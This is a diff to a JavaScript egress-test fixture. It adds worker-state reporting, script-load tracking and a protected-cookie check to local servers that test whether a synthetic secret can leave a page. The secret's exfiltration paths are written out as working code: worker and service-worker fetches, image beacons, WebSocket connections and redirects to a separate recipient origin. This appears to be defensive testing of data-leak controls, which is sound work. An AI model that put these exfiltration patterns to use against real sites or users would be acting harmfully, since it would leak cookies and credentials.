@@ -13,6 +13,8 @@ export async function createEgressFixture({ tls } = {}) {
   let credentialSeeded = false;
   const secret = `aux-private-${randomUUID()}`;
   const captures = [];
+  const scriptLoads = [];
+  const workerStates = [];
   const servers = [];
   const sockets = new Set();
   const origins = {};
@@ -30,6 +32,7 @@ export async function createEgressFixture({ tls } = {}) {
       res.setHeader("Access-Control-Allow-Headers", "X-Private");
       res.setHeader("Cache-Control", "no-store");
       if (req.method === "OPTIONS") { res.writeHead(204).end(); return; }
+      if (url.pathname === "/worker-state") { workerStates.push(url.searchParams.get("state")); res.writeHead(204).end(); return; }
       if (url.pathname === "/capture") {
         const name = url.searchParams.get("case");
         if (!cases.has(name)) { res.writeHead(400).end(); return; }
@@ -40,6 +43,7 @@ export async function createEgressFixture({ tls } = {}) {
           if (name === "credential-submit" && byteCount <= 4096) credentialBody += chunk; }
         // Record bounded metadata only. Raw URL/body and synthetic value stay out of evidence.
         captures.push({ role, case: name, method: req.method, byteCount, digest: digest.digest("hex"), at: Date.now(),
+          ...(name === "secret-cookie" ? { protectedCookiePresent: (req.headers.cookie ?? "").includes(secret) } : {}),
           ...(name === "credential-submit" ? { validCredential: new URLSearchParams(credentialBody).get("password") === credential.password } : {}) });
         res.setHeader("Content-Type", "text/plain");
         res.end("Captured"); return;
@@ -59,12 +63,13 @@ export async function createEgressFixture({ tls } = {}) {
         res.writeHead(302, { Location: captureUrl(target, name, name === "redirect-secret" ? secret : undefined) }).end(); return;
       }
       if (url.pathname === "/worker.js" || url.pathname === "/service-worker.js") {
+        scriptLoads.push({ path: url.pathname, at: Date.now() });
         res.setHeader("Content-Type", "application/javascript");
         const service = url.pathname === "/service-worker.js";
         const target = captureUrl("recipient", service ? "service-worker-secret" : "worker-secret", secret);
         res.end(service
           ? `self.addEventListener('install',e=>e.waitUntil(fetch(${JSON.stringify(target)})));`
-          : `fetch(${JSON.stringify(target)}).finally(()=>self.close());`); return;
+          : `self.postMessage('started');fetch(${JSON.stringify(target)}).then(()=>self.postMessage('sent'),()=>self.postMessage('blocked')).finally(()=>self.close());`); return;
       }
       if (!["/", "/login"].includes(url.pathname)) { res.writeHead(404).end(); return; }
       res.setHeader("Content-Type", "text/html; charset=utf-8");
@@ -93,7 +98,7 @@ const actions={
  'redirect-public':()=>send('/redirect?case=redirect-public'),
  'recipient-substitution':()=>send('/redirect?case=recipient-substitution'),
  'subresource-secret':()=>{const image=new Image();image.src=url('recipient','subresource-secret',secret);document.body.append(image);},
- 'worker-secret':()=>new Worker('/worker.js'),
+ 'worker-secret':()=>{const worker=window.egressWorker=new Worker('/worker.js');worker.onmessage=e=>{attempt.textContent+=' worker:'+e.data;new Image().src='/worker-state?state='+encodeURIComponent(e.data);};worker.onerror=()=>{attempt.textContent+=' worker:error';new Image().src='/worker-state?state=error';};},
  'service-worker-secret':()=>navigator.serviceWorker.register('/service-worker.js').catch(()=>{}),
  'websocket-protected':()=>{const socket=new WebSocket(url('recipient','websocket-protected',secret).replace(/^http/,'ws'));socket.onerror=()=>{};},
  'websocket-existing':()=>{window.existingSocket=new WebSocket(url('source','websocket-existing').replace(/^http/,'ws'));window.existingSocket.onerror=()=>{};},
@@ -130,6 +135,8 @@ for(const [name,run] of Object.entries(actions))document.getElementById(name).on
   return {
     url: `${origins.source}/`, origins, secret, credential, credentialSeeded: () => credentialSeeded,
     snapshot: () => captures.map(record => ({ ...record })),
+    scriptLoads: () => scriptLoads.map(record => ({ ...record })),
+    workerStates: () => [...workerStates],
     count: name => captures.filter(record => record.case === name).length,
     assertNoCapture(name) { assert.equal(captures.filter(record => record.case === name).length, 0, `Unexpected transmitted request for ${name}`); },
     assertCaptured(name, role = "source", count = 1) {
